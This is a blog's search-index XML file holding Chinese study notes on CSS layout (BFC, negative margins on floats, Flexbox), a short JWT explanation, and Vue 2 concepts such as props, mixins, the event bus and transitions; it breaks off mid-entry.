<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BFC</title>
      <link href="/2023/09/23/BFC/"/>
      <url>/2023/09/23/BFC/</url>
      
        <content type="html"><![CDATA[<h2 id="块级格式化上下文"><a href="#块级格式化上下文" class="headerlink" title="块级格式化上下文"></a>块级格式化上下文</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>全程Block Formatting Context，简称BFC</p><p>它是一块独立的渲染区域，规定了在该区域中，常规流块盒的布局</p><ul><li>常规流块盒在水平方向上，必须撑满包含块</li><li>常规流块盒在包含块的垂直方向上依次摆放</li><li>常规流块盒若外边距无缝相邻，则进行外边距合并</li><li>常规流块盒的自动高度和摆放位置，无视浮动元素</li></ul><h3 id="BFC的产生"><a href="#BFC的产生" class="headerlink" title="BFC的产生"></a>BFC的产生</h3><p>这个区域由某个HTML元素创建，以下元素会在其内部创建BFC区域：</p><ul><li>根元素 意味着，<code>&lt;html&gt;</code>元素创建的BFC区域，覆盖了网页中所有的元素</li><li>浮动元素和绝对定位元素</li><li>overflow不等于visible的块盒</li></ul><h2 id="包含块"><a href="#包含块" class="headerlink" title="包含块"></a>包含块</h2><ul><li>普通元素，浮动元素：父元素的内容区域</li><li>绝对定位元素：offsetParent的填充盒（padding）</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jwt</title>
      <link href="/2023/06/09/jwt/"/>
      <url>/2023/06/09/jwt/</url>
      
        <content type="html"><![CDATA[<h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><p>jwt就是Json Web Token</p><p>由三个部分组成，格式为header.payload.signature</p><p><img src="/2023/06/09/jwt/image-20230609103614667.png" alt="image-20230609103614667"></p><p>jwt并没有加密，只是对用户信息进行了一个签名，用来在服务器验证提交的信息是否被篡改过</p><p><img src="/2023/06/09/jwt/image-20230609104115307.png" alt="image-20230609104115307"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>margin负值对浮动元素的影响</title>
      <link href="/2023/06/06/margin%E8%B4%9F%E5%80%BC%E5%AF%B9%E6%B5%AE%E5%8A%A8%E5%85%83%E7%B4%A0%E7%9A%84%E5%BD%B1%E5%93%8D/"/>
      <url>/2023/06/06/margin%E8%B4%9F%E5%80%BC%E5%AF%B9%E6%B5%AE%E5%8A%A8%E5%85%83%E7%B4%A0%E7%9A%84%E5%BD%B1%E5%93%8D/</url>
      
        <content type="html"><![CDATA[<p><strong>盒子总体宽度 &#x3D; css 设置的 width（内容区域宽度）+ 左右 padding + 左右 border + 左右 margin。</strong></p><p>一般情况下，这些值都是正值，但当浮动元素的 margin 为负的时候，会有什么效果呢？（<strong>注意</strong>，padding 和 border 没有负值）</p><p>代码及图示如下（已去多余样式），有两个左浮动的盒子，我们尝试给下方绿盒子添加负值 margin。</p><h2 id="初始状态"><a href="#初始状态" class="headerlink" title="初始状态"></a>初始状态</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>下<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.outer</span> <span class="token punctuation">&#123;</span>  <span class="token property">width</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> 300px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.inner1</span> <span class="token punctuation">&#123;</span>  <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> 180px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.inner2</span> <span class="token punctuation">&#123;</span>  <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>  <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> 150px<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a><img src="/2023/06/06/margin%E8%B4%9F%E5%80%BC%E5%AF%B9%E6%B5%AE%E5%8A%A8%E5%85%83%E7%B4%A0%E7%9A%84%E5%BD%B1%E5%93%8D/image-20230606164034000.png" alt="image-20230606164034000"></h3><h3 id="当-margin-left-x3D-29px-时"><a href="#当-margin-left-x3D-29px-时" class="headerlink" title="当 margin-left &#x3D; -29px 时"></a>当 margin-left &#x3D; -29px 时</h3><p>此时，绿盒子向左移动了 29px。</p><p><img src="/2023/06/06/margin%E8%B4%9F%E5%80%BC%E5%AF%B9%E6%B5%AE%E5%8A%A8%E5%85%83%E7%B4%A0%E7%9A%84%E5%BD%B1%E5%93%8D/image-20230606164114493.png" alt="image-20230606164114493"></p><h3 id="当-margin-left-x3D-30px-时"><a href="#当-margin-left-x3D-30px-时" class="headerlink" title="当 margin-left &#x3D; -30px 时"></a>当 margin-left &#x3D; -30px 时</h3><p>此时，绿盒子跑到了第一行，并且与红盒子的右端重合了 30px，为什么呢？</p><p>初始状态时，第一行的右边只剩下 120px，已经装不下绿盒子了，所以绿盒子被挤到第二行。</p><p>已知，盒子的总体宽度 &#x3D; 内容宽度 + 左右 padding + 左右 border + 左右 margin，所以当给绿盒子设置 margin-left &#x3D; -30px 时，绿盒子的总体宽度为 150px + （0 + 0） + （0 + 0）+（- 30px + 0 ）&#x3D; 120px，所以刚刚好能够浮动上第一行的右边。</p><p>可以这么理解，就像浮动元素会浮在标准流元素上方以及 z-index 更高的定位元素会覆盖到其他定位元素上。</p><p>因为给绿盒子设置了 margin-left &#x3D; -30px，所以绿盒子的左边 30px 宽度的区域“浮”得更高了，对于红盒子来说，这绿盒子左端这 30px 相当于没有了。或者，还可以想象为绿盒子左端 30px 的 z 坐标轴上的值更大了，这 30px 已经不占这层页面的宽度了，所以我们看到绿盒子与红盒子重叠 30px。</p><p><img src="/2023/06/06/margin%E8%B4%9F%E5%80%BC%E5%AF%B9%E6%B5%AE%E5%8A%A8%E5%85%83%E7%B4%A0%E7%9A%84%E5%BD%B1%E5%93%8D/image-20230606164137669.png" alt="image-20230606164137669"></p><h3 id="当-margin-left-x3D-180px-时"><a href="#当-margin-left-x3D-180px-时" class="headerlink" title="当 margin-left &#x3D; -180px 时"></a>当 margin-left &#x3D; -180px 时</h3><p>相当于在 margin-left &#x3D; -30px 的基础上，再加上 margin-left &#x3D; -150px，即继续向左移动 150px。</p><p>此时绿盒子的左端与红盒子的左端刚刚好重叠。</p><p><img src="/2023/06/06/margin%E8%B4%9F%E5%80%BC%E5%AF%B9%E6%B5%AE%E5%8A%A8%E5%85%83%E7%B4%A0%E7%9A%84%E5%BD%B1%E5%93%8D/image-20230606164416293.png" alt="image-20230606164416293"></p><h3 id="当-margin-left-x3D-330px-时"><a href="#当-margin-left-x3D-330px-时" class="headerlink" title="当 margin-left &#x3D; -330px 时"></a>当 margin-left &#x3D; -330px 时</h3><p>由于现在已经是第一行，所以绿盒子不会继续往上一行走了，只会继续向左移动。</p><p>此时，绿盒子刚刚离开父盒子，而且右端与父盒子左端重叠。</p><p><img src="/2023/06/06/margin%E8%B4%9F%E5%80%BC%E5%AF%B9%E6%B5%AE%E5%8A%A8%E5%85%83%E7%B4%A0%E7%9A%84%E5%BD%B1%E5%93%8D/image-20230606164437579.png" alt="image-20230606164437579"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Flex布局</title>
      <link href="/2023/04/24/Flex%E5%B8%83%E5%B1%80/"/>
      <url>/2023/04/24/Flex%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Flex布局-x2F-弹性布局："><a href="#Flex布局-x2F-弹性布局：" class="headerlink" title="Flex布局&#x2F;弹性布局："></a>Flex布局&#x2F;弹性布局：</h2><p>基于 Flex 精确灵活控制块级盒子的布局方式，避免浮动布局中脱离文档流现象发生。非常适合结构化布局</p><h3 id="设置方式"><a href="#设置方式" class="headerlink" title="设置方式"></a>设置方式</h3><p>父元素添加<code> display: flex</code> ，子元素可以自动的挤压或拉伸</p><h3 id="组成部分"><a href="#组成部分" class="headerlink" title="组成部分"></a>组成部分</h3><ul><li>弹性容器</li><li>弹性盒子</li><li>主轴</li><li>交叉轴&#x2F;侧轴</li></ul><p><img src="/2023/04/24/Flex%E5%B8%83%E5%B1%80/image-20230424012454884.png" alt="image-20230424012454884"></p><h3 id="主轴对齐方式"><a href="#主轴对齐方式" class="headerlink" title="主轴对齐方式"></a>主轴对齐方式</h3><p><code>justify-content</code></p><table><thead><tr><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>flex-start</td><td>默认值，起点开始依次排列</td></tr><tr><td>flex-end</td><td>终点开始依次排列</td></tr><tr><td>center</td><td>沿主轴居中排列</td></tr><tr><td>space-around</td><td>沿主轴均匀排列，空白间距均分在盒子两侧</td></tr><tr><td>space-between</td><td>沿主轴均匀排列，空白间距均分在盒子之间</td></tr><tr><td>space-evenly</td><td>沿主轴均匀排列，空白间距处处相等（盒子与容器之间）</td></tr></tbody></table><h3 id="侧轴对齐方式"><a href="#侧轴对齐方式" class="headerlink" title="侧轴对齐方式"></a>侧轴对齐方式</h3><p><code>align-items</code>: 添加至弹性容器内</p><p><code>align-self</code>: 添加至弹性盒子</p><table><thead><tr><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>flex-start</td><td>起点开始依次排列</td></tr><tr><td>flex-end</td><td>终点开始依次排列</td></tr><tr><td>center</td><td>沿主轴居中排列</td></tr><tr><td>stretch</td><td>默认值, 弹性盒子沿着主轴线被拉伸至铺满容器</td></tr></tbody></table><h3 id="伸缩比"><a href="#伸缩比" class="headerlink" title="伸缩比"></a>伸缩比</h3><p><code>flex: 数值 </code> </p><ul><li>取值：整数</li><li>注意：只占用父盒子剩余尺寸</li></ul><h3 id="主轴方向"><a href="#主轴方向" class="headerlink" title="主轴方向"></a>主轴方向</h3><p><code>flex-direction</code></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>row</td><td>行, 水平(默认值)</td></tr><tr><td>column</td><td>列, 垂直</td></tr><tr><td>row-reverse</td><td>行, 从右向左</td></tr><tr><td>column-reverse</td><td>列, 从下向上</td></tr></tbody></table><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p><code>flex-wrap: wrap</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vue</title>
      <link href="/2023/04/10/vue/"/>
      <url>/2023/04/10/vue/</url>
      
        <content type="html"><![CDATA[<h2 id="Vue-与-VueComponent-的关系"><a href="#Vue-与-VueComponent-的关系" class="headerlink" title="Vue 与 VueComponent 的关系"></a>Vue 与 VueComponent 的关系</h2><p><img src="/2023/04/10/vue/image-20230410165310033.png" alt="image-20230410165310033"></p><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p><img src="/2023/04/10/vue/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="生命周期"></p><h3 id="父子组件生命周期执行顺序"><a href="#父子组件生命周期执行顺序" class="headerlink" title="父子组件生命周期执行顺序"></a>父子组件生命周期执行顺序</h3><p>父beforeCreate -&gt; 父created -&gt; 父beforeMount -&gt;<br>子beforeCreate -&gt; 子created -&gt; 子beforeMount -&gt; 子mounted -&gt;<br>父mounted-&gt;父beforeUpdate-&gt;<br>子beforeUpdate-&gt;子updated-&gt;<br>父updated-&gt;父beforeDestroy-&gt;<br>子beforeDestroy-&gt;子destroyed-&gt;<br>父destroyed</p><h2 id="脚手架文件结构"><a href="#脚手架文件结构" class="headerlink" title="脚手架文件结构"></a>脚手架文件结构</h2><p>├── node_modules<br>├── public<br>│ ├── favicon.ico: 页签图标<br>│ └── index.html: 主页面<br>├── src<br>│ ├── assets: 存放静态资源<br>│ │ └── logo.png<br>│ │── component: 存放组件<br>│ │ └── HelloWorld.vue<br>│ │── App.vue: 汇总所有组件<br>│ │── main.js: 入口文件<br>├── .gitignore: git 版本管制忽略的配置<br>├── babel.config.js: babel 的配置文件<br>├── package.json: 应用包配置文件<br>├── README.md: 应用描述文件<br>├── package-lock.json：包版本控制文件</p><h2 id="关于不同版本的-Vue"><a href="#关于不同版本的-Vue" class="headerlink" title="关于不同版本的 Vue"></a>关于不同版本的 Vue</h2><ol><li>vue.js 与 vue.runtime.xxx.js 的区别：<ol><li>vue.js 是完整版的 Vue，包含：核心功能 + 模板解析器。</li><li>vue.runtime.xxx.js 是运行版的 Vue，只包含：核心功能；没有模板解析器。</li></ol></li><li>因为 vue.runtime.xxx.js 没有模板解析器，所以不能使用 template 这个配置项，需要使用 render 函数接收到的 createElement 函数去指定具体内容。</li></ol><h2 id="vue-config-js-配置文件"><a href="#vue-config-js-配置文件" class="headerlink" title="vue.config.js 配置文件"></a>vue.config.js 配置文件</h2><ol><li>使用 vue inspect &gt; output.js 可以查看到 Vue 脚手架的默认配置。</li><li>使用 vue.config.js 可以对脚手架进行个性化定制，详情见：<a href="https://cli.vuejs.org/zh">https://cli.vuejs.org/zh</a></li></ol><h2 id="ref-属性"><a href="#ref-属性" class="headerlink" title="ref 属性"></a>ref 属性</h2><ol><li>被用来给元素或子组件注册引用信息（id 的替代者）</li><li>应用在 html 标签上获取的是真实 DOM 元素，应用在组件标签上是组件实例对象（vc）</li><li>使用方式：<ol><li>打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;.....&lt;/h1&gt;</code> 或 <code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li><li>获取：<code>this.$refs.xxx</code></li></ol></li></ol><h2 id="props-配置项"><a href="#props-配置项" class="headerlink" title="props 配置项"></a>props 配置项</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>让组件接收外部传过来的数据</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><ol><li><p>传递数据：<code>&lt;Demo name=&quot;xxx&quot;/&gt;</code></p></li><li><p>接收数据：</p><ul><li><p>第一种方式（只接收）：<code>props:[&#39;name&#39;] </code></p></li><li><p>第二种方式（限制类型）：<code>props:&#123;name:String&#125;</code></p></li><li><p>第三种方式（限制类型、限制必要性、指定默认值）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>   <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">type</span><span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token comment">//类型</span>      <span class="token literal-property property">required</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//必要性</span>      <span class="token keyword">default</span><span class="token operator">:</span> <span class="token string">'老王'</span> <span class="token comment">//默认值</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul><li><p>父组件 &#x3D;&#x3D;&gt; 子组件 通信</p></li><li><p>子组件 &#x3D;&#x3D;&gt; 父组件 通信（要求父先给子一个函数）</p></li></ul></li></ol><blockquote><p>备注：</p><ol><li>props 是只读的，Vue 底层会监测你对 props 的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制 props 的内容到 data 中一份，然后去修改 data 中的数据。</li><li>使用 v-model 时要切记：v-model 绑定的值不能是 props 传过来的值，因为 props 是不可以修改的！</li><li>props 传过来的若是对象类型的值，修改对象中的属性时 Vue 不会报错，但不推荐这样做。</li></ol></blockquote><h2 id="mixin-混入"><a href="#mixin-混入" class="headerlink" title="mixin(混入)"></a>mixin(混入)</h2><ol><li><p>功能：可以把多个组件共用的配置提取成一个混入对象</p></li><li><p>使用方式：</p><p>第一步定义混合：</p><pre class="line-numbers language-none"><code class="language-none">&#123;    data()&#123;....&#125;,    methods:&#123;....&#125;    ....&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第二步使用混入：</p><p>全局混入：<code>Vue.mixin(xxx)</code><br>局部混入：<code>mixins:[&#39;xxx&#39;]  </code></p></li></ol><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><ol><li><p>功能：用于增强 Vue</p></li><li><p>本质：包含 install 方法的一个对象，install 的第一个参数是 Vue，第二个以后的参数是插件使用者传递的数据。</p></li><li><p>定义插件：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">对象<span class="token punctuation">.</span><span class="token function-variable function">install</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">Vue<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 1. 添加全局过滤器</span>    Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment">// 2. 添加全局指令</span>    Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment">// 3. 配置全局混入(合)</span>    Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment">// 4. 添加实例方法</span>    <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">$myMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span>    <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$myProperty <span class="token operator">=</span> xxxx<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用插件：<code>Vue.use()</code></p></li></ol><h2 id="scoped-样式"><a href="#scoped-样式" class="headerlink" title="scoped 样式"></a>scoped 样式</h2><ol><li>作用：让样式在局部生效，防止冲突。</li><li>写法：<code>&lt;style scoped&gt;</code></li></ol><h2 id="组件化编码流程"><a href="#组件化编码流程" class="headerlink" title="组件化编码流程"></a>组件化编码流程</h2><ol><li>拆分静态组件：组件要按照功能点拆分，命名不要与 html 元素冲突。</li><li>实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：<ul><li>一个组件在用：放在组件自身即可。</li><li>一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。</li></ul></li><li>实现交互：从绑定事件开始。</li></ol><h2 id="webStorage"><a href="#webStorage" class="headerlink" title="webStorage"></a>webStorage</h2><ol><li><p>存储内容大小一般支持 5MB 左右（不同浏览器可能还不一样）</p></li><li><p>浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。</p></li><li><p>相关 API：</p><ol><li><p><code>xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;);</code><br>该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。</p></li><li><p><code>xxxxxStorage.getItem(&#39;person&#39;);</code></p><p> 该方法接受一个键名作为参数，返回键名对应的值。</p></li><li><p><code>xxxxxStorage.removeItem(&#39;key&#39;);</code></p><p> 该方法接受一个键名作为参数，并把该键名从存储中删除。</p></li><li><p><code> xxxxxStorage.clear()</code></p><p> 该方法会清空存储中的所有数据。</p></li></ol></li><li><p>备注：</p><ol><li>SessionStorage 存储的内容会随着浏览器窗口关闭而消失。</li><li>LocalStorage 存储的内容，需要手动清除才会消失。</li><li><code>xxxxxStorage.getItem(xxx)</code>如果 xxx 对应的 value 获取不到，那么 getItem 的返回值是 null。</li><li><code>JSON.parse(null)</code>的结果依然是 null。</li></ol></li></ol><h2 id="组件的自定义事件"><a href="#组件的自定义事件" class="headerlink" title="组件的自定义事件"></a>组件的自定义事件</h2><ol><li><p>一种组件间通信的方式，适用于：<strong style="color:red">子组件 &#x3D;&#x3D;&#x3D;&gt; 父组件</strong></p></li><li><p>使用场景：A 是父组件，B 是子组件，B 想给 A 传数据，那么就要在 A 中给 B 绑定自定义事件（<span style="color:red">事件的回调在 A 中</span>）。</p></li><li><p>绑定自定义事件：</p><ol><li><p>第一种方式，在父组件中：<code>&lt;Demo @demo=&quot;test&quot;/&gt;</code> 或 <code>&lt;Demo v-on:demo=&quot;test&quot;/&gt;</code></p></li><li><p>第二种方式，在父组件中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Demo ref<span class="token operator">=</span><span class="token string">"demo"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'demo'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>test<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p></li></ol></li><li><p>触发自定义事件：<code>this.$emit(&#39;demo&#39;,数据)</code></p></li><li><p>解绑自定义事件<code>this.$off(&#39;demo&#39;)</code></p></li><li><p>组件上也可以绑定原生 DOM 事件，需要使用<code>native</code>修饰符。</p></li><li><p>注意：通过<code>this.$refs.xxx.$on(&#39;demo&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在 methods 中</span>，<span style="color:red">要么用箭头函数</span>，否则 this 指向会出问题！</p></li></ol><h2 id="全局事件总线（GlobalEventBus）"><a href="#全局事件总线（GlobalEventBus）" class="headerlink" title="全局事件总线（GlobalEventBus）"></a>全局事件总线（GlobalEventBus）</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>安装全局事件总线：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>   <span class="token operator">...</span><span class="token operator">...</span>   <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$bus <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token comment">//安装全局事件总线，$bus就是当前应用的vm</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用事件总线：</p><ol><li><p>接收数据：A 组件想接收数据，则在 A 组件中给$bus 绑定自定义事件，事件的<span style="color:red">回调留在 A 组件自身。</span></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>$bus<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提供数据：<code>this.$bus.$emit(&#39;xxxx&#39;,数据)</code></p></li></ol></li><li><p>最好在 beforeDestroy 钩子中，用$off 去解绑<span style="color:red">当前组件所用到的</span>事件。</p></li></ol><h2 id="消息订阅与发布（pubsub）"><a href="#消息订阅与发布（pubsub）" class="headerlink" title="消息订阅与发布（pubsub）"></a>消息订阅与发布（pubsub）</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>使用步骤：</p><ol><li><p>安装 pubsub：<code>npm i pubsub-js</code></p></li><li><p>引入: <code>import pubsub from &#39;pubsub-js&#39;</code></p></li><li><p>接收数据：A 组件想接收数据，则在 A 组件中订阅消息，订阅的<span style="color:red">回调留在 A 组件自身。</span></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span><span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">=</span> pubsub<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span> <span class="token comment">//订阅消息</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提供数据：<code>pubsub.publish(&#39;xxx&#39;,数据)</code></p></li><li><p>最好在 beforeDestroy 钩子中，用<code>PubSub.unsubscribe(pid)</code>去<span style="color:red">取消订阅。</span></p></li></ol></li></ol><h2 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h2><ol><li>语法：<code>this.$nextTick(回调函数)</code></li><li>作用：在下一次 DOM 更新循环结束后执行其指定的回调。</li><li>什么时候用：当改变数据后，要基于更新后的新 DOM 进行某些操作时，要在 nextTick 所指定的回调函数中执行。</li></ol><h2 id="Vue-封装的过度与动画"><a href="#Vue-封装的过度与动画" class="headerlink" title="Vue 封装的过度与动画"></a>Vue 封装的过度与动画</h2><ol><li><p>作用：在插入、更新或移除 DOM 元素时，在合适的时候给元素添加样式类名。</p></li><li><p>图示：<img src="https://img04.sogoucdn.com/app/a/100520146/5990c1dff7dc7a8fb3b34b4462bd0105" style="width:60%" /></p></li><li><p>写法：</p><ol><li><p>准备好样式：</p><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul></li><li><p>使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置 name 属性：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;transition name&#x3D;&quot;hello&quot;&gt;   &lt;h1 v-show&#x3D;&quot;isShow&quot;&gt;你好啊！&lt;&#x2F;h1&gt;&lt;&#x2F;transition&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p></li></ol></li></ol><h2 id="vue-脚手架配置代理"><a href="#vue-脚手架配置代理" class="headerlink" title="vue 脚手架配置代理"></a>vue 脚手架配置代理</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在 vue.config.js 